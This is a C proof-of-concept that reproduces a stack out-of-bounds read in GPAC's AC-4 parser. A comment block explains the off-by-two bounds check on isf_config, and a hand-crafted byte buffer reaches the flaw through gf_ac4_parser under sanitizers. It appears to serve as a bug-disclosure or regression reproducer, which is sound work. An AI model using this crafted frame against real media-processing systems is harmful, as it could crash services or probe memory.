/*
 * PoC for a stack out-of-bounds READ in the AC-4 TOC parser.
 *
 * src/media_tools/av_parsers.c: gf_ac4_bed_dyn_obj_assignment() declares
 *   u32 ISF_CONFIG_TO_NUM_OBJECTS[] = {4, 8, 10, 14, 15, 30};   (6 entries)
 * but guards the bitstream-read 3-bit "isf_config" field (range 0..7) with
 *   if (isf_config >= GF_AC4_NUM_ISF_CONFIGS)   // #define'd as (1<<3) == 8
 * instead of comparing against the real array length. isf_config values 6
 * and 7 pass the guard and then index one/two elements past the array in
 *   for (i = 0; i < ISF_CONFIG_TO_NUM_OBJECTS[isf_config]; i++)
 *
 * This reaches the bug purely through the public gf_ac4_parser() API with
 * a hand-crafted AC-4 frame (as a demuxer would hand it a frame read from
 * an untrusted file). On a fixed tree, the real bounds check rejects
 * isf_config==6 and gf_ac4_parser() returns normally with no sanitizer
 * report.
 *
 * Under this project's `./configure --enable-sanitizer` build (which
 * combines ASan with UBSan's -fsanitize=bounds), the compiler can see the
 * array's size at compile time, so UBSan's bounds instrumentation fires
 * before the faulting load would otherwise trip ASan's stack redzone -
 * both are checking the exact same missing-bounds-check defect. The
 * __asan_default_options/__ubsan_default_options hooks below make the
 * sanitizer runtime abort (SIGABRT) immediately on the first detected
 * error, so no ASAN_OPTIONS/UBSAN_OPTIONS env vars are required to see
 * the crash.
 *
 * Confirmed stack trace on the vulnerable tree:
 *   gf_ac4_bed_dyn_obj_assignment (av_parsers.c:14798, the OOB index)
 *   <- gf_ac4_substream_info_ajoc
 *   <- gf_ac4_substream_group_info
 *   <- gf_ac4_raw_frame
 *   <- gf_ac4_parser_bs
 *   <- gf_ac4_parser
 */

#include <gpac/tools.h>
#include <gpac/avparse.h>
#include <gpac/mpeg4_odf.h>
#include <string.h>

const char *__asan_default_options(void) { return "abort_on_error=1:halt_on_error=1"; }
const char *__ubsan_default_options(void) { return "abort_on_error=1:halt_on_error=1"; }

int main(void)
{
	gf_sys_init(GF_MemTrackerNone, NULL);

	/* Hand-crafted minimal AC-4 frame, MSB-first bit reads:
	 *  byte0-1: sync word 0xAC40
	 *  byte2-3: frame_size (16 bits, value unused before the crash)
	 *  then, inside gf_ac4_raw_frame():
	 *   bitstream_version=2, sequence_counter=0, b_wait_frames=0, fs_index=0,
	 *   frame_rate_index=13 (cheapest frame-rate-multiply/fraction path: 0 extra bits),
	 *   b_iframe_global=0, b_single_presentation=1 (n_presentations=1), b_payload_base=0,
	 *   b_program_id=0;
	 *  inside gf_ac4_presentation_v1_info(): b_single_substream_group=1,
	 *   presentation_version stop-bit=0, md_compat=0, b_presentation_id=0,
	 *   emdf_info all-zero (emdf_version=0, key_id=0, b_emdf_payloads_substream_info=0,
	 *   n_skip_bytes_length_primary/secondary=0), b_presentation_filter=0,
	 *   sgi_specifier group_index=0 (-> max_group_index=0), b_pre_virtualized=0,
	 *   b_add_emdf_substreams=0, presentation_substream_info all-zero
	 *   (b_alternative=0, b_pres_ndot=0, substream_index=0);
	 *  inside gf_ac4_substream_group_info(): b_substreams_present=0, b_hsf_ext=0,
	 *   b_single_substream=1 (n_lf_substreams=1), b_channel_coded=0 (object/ajoc path),
	 *   b_oamd_substream=0, b_ajoc=1;
	 *  inside gf_ac4_substream_info_ajoc(): b_lfe=0, b_static_dmx=1 (skips the first,
	 *   unrelated bed_dyn_obj_assignment call), b_oamd_common_data_present=0,
	 *   n_fullband_upmix_signals_minus1=0;
	 *  inside gf_ac4_bed_dyn_obj_assignment(): b_dyn_objects_only=0, b_isf=1,
	 *   isf_config=6 (passes the buggy ">= 8" guard, then indexes one past the
	 *   6-element ISF_CONFIG_TO_NUM_OBJECTS[] array -> crash).
	 * 16 trailing zero bytes pad the bitstream so no read runs past the buffer.
	 */
	static const u8 buf[] = {
		0xAC, 0x40, 0x00, 0x00, 0x80, 0x03, 0x52, 0x00, 0x00, 0x00,
		0x25, 0x03, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
	};

	GF_AC4Config hdr;
	memset(&hdr, 0, sizeof(hdr));
	u32 pos = 0;
	Bool ret = gf_ac4_parser((u8 *)buf, sizeof(buf), &pos, &hdr, GF_TRUE, GF_FALSE);
	fprintf(stderr, "gf_ac4_parser returned %d, pos=%u (no crash)\n", ret, pos);

	gf_odf_ac4_cfg_clean_list(&hdr);
	gf_sys_close();
	return 0;
}
